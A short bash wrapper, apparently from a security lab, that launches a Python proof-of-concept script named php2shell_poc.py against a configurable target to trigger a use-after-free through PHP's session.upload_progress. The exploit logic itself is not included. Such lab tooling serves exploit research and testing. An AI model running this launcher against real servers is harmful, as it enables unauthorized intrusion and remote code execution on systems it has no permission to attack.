#!/usr/bin/env bash
set -euo pipefail

TARGET_HOST="${TARGET_HOST:-target}"
TARGET_PORT="${TARGET_PORT:-80}"
ROUNDS="${ROUNDS:-5}"
STALL="${STALL:-1.5}"

echo "=== UAF trigger (session.upload_progress) against ${TARGET_HOST}:${TARGET_PORT} ==="
python3 /opt/lab/scripts/php2shell_poc.py \
  -t "$TARGET_HOST" \
  -p "$TARGET_PORT" \
  --monitor \
  --rounds "$ROUNDS" \
  -s "$STALL" \
  "$@"
